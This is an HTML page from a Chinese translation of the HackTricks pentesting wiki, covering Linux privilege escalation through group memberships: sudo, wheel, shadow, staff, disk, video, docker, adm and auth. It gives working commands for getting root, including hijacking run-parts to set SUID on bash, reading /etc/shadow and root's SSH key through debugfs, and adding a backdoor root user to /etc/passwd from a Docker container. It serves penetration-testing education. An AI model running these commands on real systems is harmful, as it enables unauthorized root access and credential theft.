@@ -1,0 +1,397 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Interesting Groups - Linux Privesc</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../favicon.png">
+        <link rel="stylesheet" href="../../../css/variables.css">
+        <link rel="stylesheet" href="../../../css/general.css">
+        <link rel="stylesheet" href="../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../highlight.css">
+        <link rel="stylesheet" href="../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="有趣的组---linux-权限提升"><a class="header" href="#有趣的组---linux-权限提升">有趣的组 - Linux 权限提升</a></h1>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<h2 id="sudo管理员组"><a class="header" href="#sudo管理员组">Sudo/管理员组</a></h2>
+<h3 id="pe---方法-1"><a class="header" href="#pe---方法-1"><strong>PE - 方法 1</strong></a></h3>
+<p><strong>有时</strong>，**默认情况下（或因为某些软件需要它）**在 <strong>/etc/sudoers</strong> 文件中可以找到一些这样的行：</p>
+<pre><code class="language-bash"># Allow members of group sudo to execute any command
+%sudo	ALL=(ALL:ALL) ALL
+
+# Allow members of group admin to execute any command
+%admin 	ALL=(ALL:ALL) ALL
+</code></pre>
+<p>这意味着<strong>任何属于sudo或admin组的用户都可以以sudo身份执行任何操作</strong>。</p>
+<p>如果是这种情况，要<strong>成为root，你只需执行</strong>：</p>
+<pre><code>sudo su
+</code></pre>
+<h3 id="pe---方法-2"><a class="header" href="#pe---方法-2">PE - 方法 2</a></h3>
+<p>查找所有 suid 二进制文件，并检查是否存在二进制文件 <strong>Pkexec</strong>：</p>
+<pre><code class="language-bash">find / -perm -4000 2&gt;/dev/null
+</code></pre>
+<p>如果你发现二进制文件 <strong>pkexec 是一个 SUID 二进制文件</strong>，并且你属于 <strong>sudo</strong> 或 <strong>admin</strong>，你可能可以使用 <code>pkexec</code> 以 sudo 身份执行二进制文件。<br />
+这是因为通常这些是 <strong>polkit 策略</strong> 内的组。该策略基本上识别哪些组可以使用 <code>pkexec</code>。使用以下命令检查：</p>
+<pre><code class="language-bash">cat /etc/polkit-1/localauthority.conf.d/*
+</code></pre>
+<p>在那里你会发现哪些组被允许执行 <strong>pkexec</strong>，并且在某些 Linux 发行版中，<strong>sudo</strong> 和 <strong>admin</strong> 组默认出现。</p>
+<p>要 <strong>成为 root，你可以执行</strong>：</p>
+<pre><code class="language-bash">pkexec "/bin/sh" #You will be prompted for your user password
+</code></pre>
+<p>如果你尝试执行 <strong>pkexec</strong> 并且收到这个 <strong>错误</strong>：</p>
+<pre><code class="language-bash">polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
+==== AUTHENTICATION FAILED ===
+Error executing command as another user: Not authorized
+</code></pre>
+<p><strong>这不是因为你没有权限，而是因为你没有通过GUI连接</strong>。对此问题有一个解决方法在这里: <a href="https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903">https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903</a>。你需要<strong>2个不同的ssh会话</strong>：</p>
+<p>{% code title="session1" %}</p>
+<pre><code class="language-bash">echo $$ #Step1: Get current PID
+pkexec "/bin/bash" #Step 3, execute pkexec
+#Step 5, if correctly authenticate, you will have a root session
+</code></pre>
+<p>{% endcode %}</p>
+<p>{% code title="session2" %}</p>
+<pre><code class="language-bash">pkttyagent --process &lt;PID of session1&gt; #Step 2, attach pkttyagent to session1
+#Step 4, you will be asked in this session to authenticate to pkexec
+</code></pre>
+<p>{% endcode %}</p>
+<h2 id="wheel-group"><a class="header" href="#wheel-group">Wheel Group</a></h2>
+<p><strong>有时</strong>，<strong>默认情况下</strong>在**/etc/sudoers**文件中可以找到这一行：</p>
+<pre><code>%wheel	ALL=(ALL:ALL) ALL
+</code></pre>
+<p>这意味着<strong>任何属于wheel组的用户都可以以sudo身份执行任何操作</strong>。</p>
+<p>如果是这种情况，要<strong>成为root，你只需执行</strong>：</p>
+<pre><code>sudo su
+</code></pre>
+<h2 id="shadow-group"><a class="header" href="#shadow-group">Shadow Group</a></h2>
+<p>来自 <strong>group shadow</strong> 的用户可以 <strong>read</strong> <strong>/etc/shadow</strong> 文件：</p>
+<pre><code>-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
+</code></pre>
+<p>So, read the file and try to <strong>crack some hashes</strong>.</p>
+<h2 id="staff-group"><a class="header" href="#staff-group">Staff Group</a></h2>
+<p><strong>staff</strong>: 允许用户在不需要根权限的情况下对系统（<code>/usr/local</code>）进行本地修改（请注意，<code>/usr/local/bin</code> 中的可执行文件在任何用户的 PATH 变量中，并且它们可能会“覆盖” <code>/bin</code> 和 <code>/usr/bin</code> 中同名的可执行文件）。与更相关于监控/安全的 "adm" 组进行比较。 <a href="https://wiki.debian.org/SystemGroups">[source]</a></p>
+<p>在 debian 发行版中，<code>$PATH</code> 变量显示 <code>/usr/local/</code> 将以最高优先级运行，无论您是否是特权用户。</p>
+<pre><code class="language-bash">$ echo $PATH
+/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+
+# echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+</code></pre>
+<p>如果我们可以劫持 <code>/usr/local</code> 中的一些程序，我们就可以轻松获得 root 权限。</p>
+<p>劫持 <code>run-parts</code> 程序是一种轻松获得 root 权限的方法，因为大多数程序会像 (crontab, 当 ssh 登录时) 一样运行 <code>run-parts</code>。</p>
+<pre><code class="language-bash">$ cat /etc/crontab | grep run-parts
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || { cd / &amp;&amp; run-parts --report /etc/cron.daily; }
+47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / &amp;&amp; run-parts --report /etc/cron.weekly; }
+52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / &amp;&amp; run-parts --report /etc/cron.monthly; }
+</code></pre>
+<p>或当新的 ssh 会话登录时。</p>
+<pre><code class="language-bash">$ pspy64
+2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
+2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
+2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
+2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new
+2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new
+2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
+2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
+2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
+2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
+</code></pre>
+<p><strong>利用</strong></p>
+<pre><code class="language-bash"># 0x1 Add a run-parts script in /usr/local/bin/
+$ vi /usr/local/bin/run-parts
+#! /bin/bash
+chmod 4777 /bin/bash
+
+# 0x2 Don't forget to add a execute permission
+$ chmod +x /usr/local/bin/run-parts
+
+# 0x3 start a new ssh sesstion to trigger the run-parts program
+
+# 0x4 check premission for `u+s`
+$ ls -la /bin/bash
+-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash
+
+# 0x5 root it
+$ /bin/bash -p
+</code></pre>
+<h2 id="磁盘组"><a class="header" href="#磁盘组">磁盘组</a></h2>
+<p>此权限几乎<strong>等同于根访问</strong>，因为您可以访问机器内部的所有数据。</p>
+<p>文件：<code>/dev/sd[a-z][1-9]</code></p>
+<pre><code class="language-bash">df -h #Find where "/" is mounted
+debugfs /dev/sda1
+debugfs: cd /root
+debugfs: ls
+debugfs: cat /root/.ssh/id_rsa
+debugfs: cat /etc/shadow
+</code></pre>
+<p>注意，使用 debugfs 你也可以 <strong>写文件</strong>。例如，要将 <code>/tmp/asd1.txt</code> 复制到 <code>/tmp/asd2.txt</code>，你可以这样做：</p>
+<pre><code class="language-bash">debugfs -w /dev/sda1
+debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
+</code></pre>
+<p>然而，如果你尝试<strong>写入由 root 拥有的文件</strong>（如 <code>/etc/shadow</code> 或 <code>/etc/passwd</code>），你将会遇到“<strong>权限被拒绝</strong>”错误。</p>
+<h2 id="视频组"><a class="header" href="#视频组">视频组</a></h2>
+<p>使用命令 <code>w</code> 你可以找到<strong>谁已登录系统</strong>，它将显示如下输出：</p>
+<pre><code class="language-bash">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
+moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
+</code></pre>
+<p><strong>tty1</strong> 表示用户 <strong>yossi 正在物理登录</strong> 到机器上的一个终端。</p>
+<p><strong>video group</strong> 有权限查看屏幕输出。基本上，你可以观察屏幕。在此之前，你需要 <strong>以原始数据抓取当前屏幕上的图像</strong> 并获取屏幕使用的分辨率。屏幕数据可以保存在 <code>/dev/fb0</code>，你可以在 <code>/sys/class/graphics/fb0/virtual_size</code> 找到该屏幕的分辨率。</p>
+<pre><code class="language-bash">cat /dev/fb0 &gt; /tmp/screen.raw
+cat /sys/class/graphics/fb0/virtual_size
+</code></pre>
+<p>要<strong>打开</strong> <strong>原始图像</strong>，您可以使用<strong>GIMP</strong>，选择**<code>screen.raw</code><strong>文件，并选择文件类型为</strong>原始图像数据**：</p>
+<p><img src="../../../.gitbook/assets/image%20(463).png" alt="" /></p>
+<p>然后将宽度和高度修改为屏幕上使用的值，并检查不同的图像类型（并选择显示屏幕效果更好的那个）：</p>
+<p><img src="../../../.gitbook/assets/image%20(317).png" alt="" /></p>
+<h2 id="root-group"><a class="header" href="#root-group">Root Group</a></h2>
+<p>看起来默认情况下<strong>root组的成员</strong>可以访问<strong>修改</strong>某些<strong>服务</strong>配置文件或某些<strong>库</strong>文件或<strong>其他有趣的东西</strong>，这些都可以用来提升权限...</p>
+<p><strong>检查root成员可以修改哪些文件</strong>：</p>
+<pre><code class="language-bash">find / -group root -perm -g=w 2&gt;/dev/null
+</code></pre>
+<h2 id="docker-组"><a class="header" href="#docker-组">Docker 组</a></h2>
+<p>您可以<strong>将主机的根文件系统挂载到实例的卷</strong>，因此当实例启动时，它会立即加载一个 <code>chroot</code> 到该卷中。这实际上使您在机器上获得了 root 权限。</p>
+<pre><code class="language-bash">docker image #Get images from the docker service
+
+#Get a shell inside a docker container with access as root to the filesystem
+docker run -it --rm -v /:/mnt &lt;imagename&gt; chroot /mnt bash
+#If you want full access from the host, create a backdoor in the passwd file
+echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' &gt;&gt; /etc/passwd
+
+#Ifyou just want filesystem and network access you can startthe following container:
+docker run --rm -it --pid=host --net=host --privileged -v /:/mnt &lt;imagename&gt; chroot /mnt bashbash
+</code></pre>
+<p>最后，如果你不喜欢之前的任何建议，或者由于某种原因它们不起作用（docker api 防火墙？），你可以尝试<strong>运行一个特权容器并从中逃逸</strong>，如这里所述：</p>
+<p>{% content-ref url="../docker-security/" %}
+<a href="../docker-security/">docker-security</a>
+{% endcontent-ref %}</p>
+<p>如果你对 docker socket 有写权限，请阅读<a href="../#writable-docker-socket"><strong>这篇关于如何通过滥用 docker socket 提升权限的文章</strong></a><strong>。</strong></p>
+<p>{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}</p>
+<p>{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}</p>
+<h2 id="lxclxd-组"><a class="header" href="#lxclxd-组">lxc/lxd 组</a></h2>
+<p>{% content-ref url="./" %}
+<a href="./">.</a>
+{% endcontent-ref %}</p>
+<h2 id="adm-组"><a class="header" href="#adm-组">Adm 组</a></h2>
+<p>通常，<strong><code>adm</code></strong> 组的<strong>成员</strong>有权限<strong>读取</strong>位于 <em>/var/log/</em> 中的日志文件。<br />
+因此，如果你已经攻陷了这个组中的用户，你应该确实<strong>查看日志</strong>。</p>
+<h2 id="auth-组"><a class="header" href="#auth-组">Auth 组</a></h2>
+<p>在 OpenBSD 中，<strong>auth</strong> 组通常可以在 <em><strong>/etc/skey</strong></em> 和 <em><strong>/var/db/yubikey</strong></em> 文件夹中写入，如果它们被使用。<br />
+这些权限可能会被以下漏洞利用来<strong>提升权限</strong>到 root：<a href="https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot">https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot</a></p>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>telegram 群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../linux-hardening/privilege-escalation/euid-ruid-suid.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../linux-hardening/privilege-escalation/euid-ruid-suid.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../elasticlunr.min.js"></script>
+        <script src="../../../mark.min.js"></script>
+        <script src="../../../searcher.js"></script>
+
+        <script src="../../../clipboard.min.js"></script>
+        <script src="../../../highlight.js"></script>
+        <script src="../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
